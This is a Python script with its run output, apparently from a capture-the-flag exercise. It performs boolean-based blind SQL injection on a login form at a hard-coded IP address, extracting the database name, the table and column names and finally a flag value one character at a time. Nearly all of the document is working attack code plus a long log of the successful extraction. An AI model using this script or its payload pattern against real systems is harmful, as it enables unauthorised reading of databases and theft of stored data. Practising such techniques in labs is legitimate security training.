"""
登录框可以进行注入，但只显示True / Fasle
通过真假来逐个爆破内容
admin' and length(database())>=8 #
admin' and length(database())<8 #

"""

import requests
import time

target_url = "http://49.235.141.207:25501/test_sql/bool_login/"
# payload依次填充sql，offset，爆破字符
# admin' and ord(substr("a23",1,1))=97 #
payload = "admin' AND  ord(  substr(({}),{},1) )={} #"

sql_get_database = "SELECT database()"
sql_get_table = "SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()"
# 填充要查询的表名
sql_get_columns = "SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='bmaq_flag'"
# 填充列名，表名
sql_get_content = "select group_concat(id,0x3a,flag) from bmaq_flag"

sqli_list = [ sql_get_database, sql_get_table,sql_get_columns, sql_get_columns, sql_get_content]


for sql in sqli_list:
    res = "message: "
    print(sql)
    for offset in range(1, 50):
        for chr_ascii in range(0,128):
            form_data_payload = payload.format(sql, offset, chr_ascii)
            form_data = {'username':form_data_payload,'password':'1','submit':'%E6%8F%90%E4%BA%A4'}
            # print(form_data)
            response = requests.post(target_url, form_data)
            html = response.text
            # print(html)

            if "login success" in html:
                res+=chr(chr_ascii)
                print(res)
                break


"""
/usr/local/bin/python3.7 /Users/demeter/code_library/CTF/sqli_bool_login.py
SELECT database()
message: b
message: bo
message: boo
message: bool
message: bool_
message: bool_l
message: bool_lo
message: bool_log
message: bool_logi
message: bool_login
message: bool_login_
message: bool_login_d
message: bool_login_db
message: bool_login_db 
message: bool_login_db  
message: bool_login_db   
message: bool_login_db    
message: bool_login_db     
message: bool_login_db      
message: bool_login_db       
message: bool_login_db        
message: bool_login_db         
message: bool_login_db          
message: bool_login_db           
message: bool_login_db            
message: bool_login_db             
message: bool_login_db              
message: bool_login_db               
message: bool_login_db                
message: bool_login_db                 
message: bool_login_db                  
message: bool_login_db                   
message: bool_login_db                    
message: bool_login_db                     
message: bool_login_db                      
message: bool_login_db                       
message: bool_login_db                        
message: bool_login_db                         
message: bool_login_db                          
message: bool_login_db                           
message: bool_login_db                            
message: bool_login_db                             
message: bool_login_db                              
message: bool_login_db                               
message: bool_login_db                                
message: bool_login_db                                 
message: bool_login_db                                  
message: bool_login_db                                   
message: bool_login_db                                    
SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
message: b
message: bm
message: bma
message: bmaq
message: bmaq_
message: bmaq_f
message: bmaq_fl
message: bmaq_fla
message: bmaq_flag
message: bmaq_flag,
message: bmaq_flag,b
message: bmaq_flag,bo
message: bmaq_flag,boo
message: bmaq_flag,bool
message: bmaq_flag,bool_
message: bmaq_flag,bool_l
message: bmaq_flag,bool_lo
message: bmaq_flag,bool_log
message: bmaq_flag,bool_logi
message: bmaq_flag,bool_login
message: bmaq_flag,bool_login 
message: bmaq_flag,bool_login  
message: bmaq_flag,bool_login   
message: bmaq_flag,bool_login    
message: bmaq_flag,bool_login     
message: bmaq_flag,bool_login      
message: bmaq_flag,bool_login       
message: bmaq_flag,bool_login        
message: bmaq_flag,bool_login         
message: bmaq_flag,bool_login          
message: bmaq_flag,bool_login           
message: bmaq_flag,bool_login            
message: bmaq_flag,bool_login             
message: bmaq_flag,bool_login              
message: bmaq_flag,bool_login               
message: bmaq_flag,bool_login                
message: bmaq_flag,bool_login                 
message: bmaq_flag,bool_login                  
message: bmaq_flag,bool_login                   
message: bmaq_flag,bool_login                    
message: bmaq_flag,bool_login                     
message: bmaq_flag,bool_login                      
message: bmaq_flag,bool_login                       
message: bmaq_flag,bool_login                        
message: bmaq_flag,bool_login                         
message: bmaq_flag,bool_login                          
message: bmaq_flag,bool_login                           
message: bmaq_flag,bool_login                            
message: bmaq_flag,bool_login                             
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='bmaq_flag'
message: i
message: id
message: id,
message: id,f
message: id,fl
message: id,fla
message: id,flag
message: id,flag 
message: id,flag  
message: id,flag   
message: id,flag    
message: id,flag     
message: id,flag      
message: id,flag       
message: id,flag        
message: id,flag         
message: id,flag          
message: id,flag           
message: id,flag            
message: id,flag             
message: id,flag              
message: id,flag               
message: id,flag                
message: id,flag                 
message: id,flag                  
message: id,flag                   
message: id,flag                    
message: id,flag                     
message: id,flag                      
message: id,flag                       
message: id,flag                        
message: id,flag                         
message: id,flag                          
message: id,flag                           
message: id,flag                            
message: id,flag                             
message: id,flag                              
message: id,flag                               
message: id,flag                                
message: id,flag                                 
message: id,flag                                  
message: id,flag                                   
message: id,flag                                    
message: id,flag                                     
message: id,flag                                      
message: id,flag                                       
message: id,flag                                        
message: id,flag                                         
message: id,flag                                          
SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema=database() AND table_name='bmaq_flag'
message: i
message: id
message: id,
message: id,f
message: id,fl
message: id,fla
message: id,flag
message: id,flag 
message: id,flag  
message: id,flag   
message: id,flag    
message: id,flag     
message: id,flag      
message: id,flag       
message: id,flag        
message: id,flag         
message: id,flag          
message: id,flag           
message: id,flag            
message: id,flag             
message: id,flag              
message: id,flag               
message: id,flag                
message: id,flag                 
message: id,flag                  
message: id,flag                   
message: id,flag                    
message: id,flag                     
message: id,flag                      
message: id,flag                       
message: id,flag                        
message: id,flag                         
message: id,flag                          
message: id,flag                           
message: id,flag                            
message: id,flag                             
message: id,flag                              
message: id,flag                               
message: id,flag                                
message: id,flag                                 
message: id,flag                                  
message: id,flag                                   
message: id,flag                                    
message: id,flag                                     
message: id,flag                                      
message: id,flag                                       
message: id,flag                                        
message: id,flag                                         
message: id,flag                                          
select group_concat(id,0x3a,flag) from bmaq_flag
message: 1
message: 1:
message: 1:w
message: 1:wh
message: 1:whs
message: 1:whse
message: 1:whsec
message: 1:whsec{
message: 1:whsec{0
message: 1:whsec{05
message: 1:whsec{056
message: 1:whsec{056f
message: 1:whsec{056f3
message: 1:whsec{056f32
message: 1:whsec{056f32e
message: 1:whsec{056f32ee
message: 1:whsec{056f32ee5
message: 1:whsec{056f32ee5c
message: 1:whsec{056f32ee5cf
message: 1:whsec{056f32ee5cf4
message: 1:whsec{056f32ee5cf49
message: 1:whsec{056f32ee5cf494
message: 1:whsec{056f32ee5cf4940
message: 1:whsec{056f32ee5cf49404
message: 1:whsec{056f32ee5cf494046
message: 1:whsec{056f32ee5cf4940460
message: 1:whsec{056f32ee5cf49404607
message: 1:whsec{056f32ee5cf49404607e
message: 1:whsec{056f32ee5cf49404607e3
message: 1:whsec{056f32ee5cf49404607e36
message: 1:whsec{056f32ee5cf49404607e368
message: 1:whsec{056f32ee5cf49404607e368b
message: 1:whsec{056f32ee5cf49404607e368bd
message: 1:whsec{056f32ee5cf49404607e368bd8
message: 1:whsec{056f32ee5cf49404607e368bd8d
message: 1:whsec{056f32ee5cf49404607e368bd8d3
message: 1:whsec{056f32ee5cf49404607e368bd8d3f
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2a
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af} 
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}  
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}   
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}    
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}     
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}      
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}       
message: 1:whsec{056f32ee5cf49404607e368bd8d3f2af}        

Process finished with exit code 0

"""